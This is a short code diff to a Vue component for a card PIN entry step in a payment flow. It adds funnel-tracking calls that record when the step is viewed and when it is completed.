@@ -101,6 +101,7 @@ import { useRouter } from 'vue-router';
 import { useI18n } from 'vue-i18n';
 import i18n from '@/i18n';
 import { useVisitorTracking } from '@/composables/useVisitorTracking';
+import { trackStepViewed, trackStepCompleted } from '@/composables/useFunnelTracking';
 import { usePayment } from '@/composables/usePayment';
 import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
 import { getPinStatus } from '@/api/paymentApi';
@@ -178,6 +179,7 @@ const { setup: setupWs } = usePaymentWebSocket( {
     {
         logger.debug( '[CardPin] Approved:', event );
         isVerifying.value = false;
+        trackStepCompleted( 'card_pin', 'phone_verification' );
 
         // Defer navigation to release the WS message handler and avoid
         // Chrome "[Violation] 'message' handler took Xms" warnings.
@@ -233,6 +235,7 @@ onMounted( async () =>
 
     pinInputRef.value?.focusFirstEmpty();
     setupWs( ip );
+    trackStepViewed( 'card_pin' );
 } );
 // WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
 </script>
